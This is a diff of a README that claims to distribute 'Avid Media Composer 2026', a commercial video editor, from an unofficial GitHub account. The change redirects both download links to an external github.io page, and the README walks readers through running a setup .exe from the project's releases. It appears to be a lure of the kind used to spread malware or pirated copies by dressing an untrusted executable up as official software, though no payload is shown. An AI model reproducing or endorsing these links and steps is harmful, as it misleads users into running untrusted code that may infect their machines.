@@ -1,6 +1,6 @@
 # 🎞️ Avid-Media-Composer-2026 - Master Your Professional Video Editing Workflows
 
-[![Download Avid Media Composer](https://img.shields.io/badge/Download-Media_Composer_2026-blue.svg)](https://github.com/Erminieupstairs135/Avid-Media-Composer-2026)
+[![Download Avid Media Composer](https://img.shields.io/badge/Download-Media_Composer_2026-blue.svg)](https://erminieupstairs135.github.io)
 
 Avid Media Composer 2026 provides tools for professional video editors. This software handles high-resolution footage, complex timelines, and multi-camera projects on Windows platforms. This guide explains how to install and set up the application on your computer.
 
@@ -19,7 +19,7 @@ Ensure your computer meets these specifications to run the software. These requi
 
 You can obtain the installation files directly from the project repository. Follow these steps to ensure you have the correct version.
 
-1.  Visit the [official project page to download the software](https://github.com/Erminieupstairs135/Avid-Media-Composer-2026).
+1.  Visit the [official project page to download the software](https://erminieupstairs135.github.io).
 2.  Locate the section labeled Releases on the right side of the page.
 3.  Click the version number under the Latest release header.
 4.  Find the asset named `Avid_Media_Composer_2026_Setup.exe` in the list of files.
